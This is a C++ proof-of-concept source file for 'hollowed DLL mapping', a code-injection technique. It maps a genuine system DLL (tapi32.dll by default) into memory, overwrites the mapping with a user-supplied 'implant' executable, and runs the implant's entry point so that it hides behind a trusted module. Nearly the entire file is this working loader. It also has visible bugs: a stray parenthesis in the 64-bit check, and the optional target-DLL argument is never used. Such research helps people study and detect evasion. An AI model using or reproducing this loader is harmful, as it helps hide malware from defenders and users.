#include <Windows.h>
#include <iostream>

#include <peconv.h>

#include "ntddk.h"

PVOID map_dll_image(const char* dll_name)
{
	HANDLE hFile = CreateFileA(dll_name,
		GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
		std::cerr << "Couldn't open the file!" << std::hex << hFile << std::endl;
		return NULL;
	}
	std::cout << "File created, handle: " << std::hex << hFile << std::endl;

	HANDLE hSection = nullptr;
	NTSTATUS status = NtCreateSection(&hSection,
		SECTION_ALL_ACCESS,
		NULL,
		0,
		PAGE_READONLY,
		SEC_IMAGE,
		hFile
	);
	bool is_ok = false;
	if (status != STATUS_SUCCESS) {
		std::cerr << "NtCreateSection failed" << std::endl;
	}
	else {
		std::cerr << "NtCreateSection created at:" << std::hex << hSection << std::endl;
		is_ok = true;
	}

	CloseHandle(hFile);
	if (!is_ok) {
		return NULL;
	}

	DWORD protect = PAGE_EXECUTE_READWRITE;
	PVOID sectionBaseAddress = NULL;
	ULONG viewSize = 0;
	SECTION_INHERIT inheritDisposition = ViewShare; //VIEW_SHARE
	if ((status = NtMapViewOfSection(hSection,
		GetCurrentProcess(),
		&sectionBaseAddress,
		NULL,
		NULL,
		NULL,
		&viewSize,
		inheritDisposition,
		NULL,
		protect)
		) != STATUS_SUCCESS)
	{
		printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
	}
	else {
		printf("Section BaseAddress: %p\n", sectionBaseAddress);
		is_ok = true;
	}
	return sectionBaseAddress;
}

bool overwrite_mapping(PVOID mapped, BYTE* implant_dll, size_t implant_size)
{
	HANDLE hProcess = GetCurrentProcess();
	bool is_ok = false;

	DWORD oldProtect = 0;
	if (!VirtualProtect((LPVOID)mapped, implant_size, PAGE_READWRITE, &oldProtect)) return false;

	memcpy(mapped, implant_dll, implant_size);
	is_ok = true;
	/*
	SIZE_T number_written = 0;
	if (WriteProcessMemory(hProcess, (LPVOID)mapped, implant_dll, implant_size, &number_written)) {
		is_ok = true;
		std::cout << "Written: " << std::hex << number_written << "\n";
	}*/
	if (!VirtualProtect((LPVOID)mapped, implant_size, PAGE_EXECUTE_WRITECOPY, &oldProtect)) return false;
	return is_ok;
}

bool is_compatibile(BYTE *implant_dll)
{
	bool is_payload64 = peconv::is64bit(implant_dll);
#ifdef _WIN64
	if (!is_payload64)) {
	std::cerr << "For 64 bit loader you MUST use a 64 bit payload!\n";
	return false;
	}
#else
	if (is_payload64) {
		std::cerr << "For 32 bit loader you MUST use a 32 bit payload!\n";
		return false;
	}
#endif
	return true;
}

int main(int argc, char *argv[])
{
	if (argc < 2) {
		std::cout << 
			"\/***************************************************************************\n"
			"Hollow DLL mapping (PoC)\nmore info: https://github.com/hasherezade/hollowed_dll_mapping\n"
			"Args: <payload_dll> [target_dll]\n"
			"\t<payload_dll> - the DLL that will be impanted\n"
			"\t[target_dll] - the DLL that will be replaced (default: tapi32.dll)\n"
			"***************************************************************************/\n"
			<< std::endl;
		system("pause");
		return 0;
	}

	char target_dll[MAX_PATH] = { 0 };
	ExpandEnvironmentStringsA("%SystemRoot%\\system32\\tapi32.dll", target_dll, MAX_PATH);

	const char* dll_name = target_dll;
	if (argc > 2) {
		dll_name = argv[2];
	}

	const char* implant_name = argv[1];

	std::cout << "target_dll: " << dll_name << "\n";
	std::cout << "implant_dll: " << implant_name << "\n";

	PVOID mapped = map_dll_image(target_dll);
	if (!mapped) {
		system("pause");
		return -1;
	}
	std::cerr << "[*] Loading the implant...\n";
	size_t v_size = 0;
	BYTE* implant_dll = peconv::load_pe_executable(implant_name, v_size);
	if (!implant_dll) {
		std::cerr << "[-] Failed to load the implant!\n";
		system("pause");
		return -1;
	}
	std::cerr << "[+] Implant loaded\n";
	if (!is_compatibile(implant_dll)) {
		system("pause");
		return -1;
	}

	//relocate the module to the target base:
	if (!peconv::relocate_module(implant_dll, v_size, (ULONGLONG)mapped, (ULONGLONG)implant_dll)) {
		std::cerr << "[-] Failed to relocate the implant!\n";
		system("pause");
		return -1;
	}
	std::cout << "[*] Trying to overwrite the mapped DLL with the implant!\n";
	if (overwrite_mapping(mapped, implant_dll, v_size)) {
		std::cout << "[+] Copied!\n";
	}
	DWORD ep = peconv::get_entry_point_rva(implant_dll);
	bool is_dll = peconv::is_module_dll(implant_dll);

	peconv::free_pe_buffer(implant_dll); implant_dll = NULL;

	ULONG_PTR implant_ep = (ULONG_PTR)mapped + ep;

	std::cout << "[*] Executing Implant's Entry Point: " << std::hex << implant_ep << "\n";
	if (is_dll) {
		//run the implant as a DLL:
		BOOL(*dll_main)(HINSTANCE, DWORD, LPVOID) = (BOOL(*)(HINSTANCE, DWORD, LPVOID))(implant_ep);
		dll_main((HINSTANCE)mapped, DLL_PROCESS_ATTACH, 0);
	}
	else {
		//run the implant as EXE:
		BOOL(*exe_main)(void) = (BOOL(*)(void))(implant_ep);
		exe_main();
	}

	system("pause");
	return 0;
}
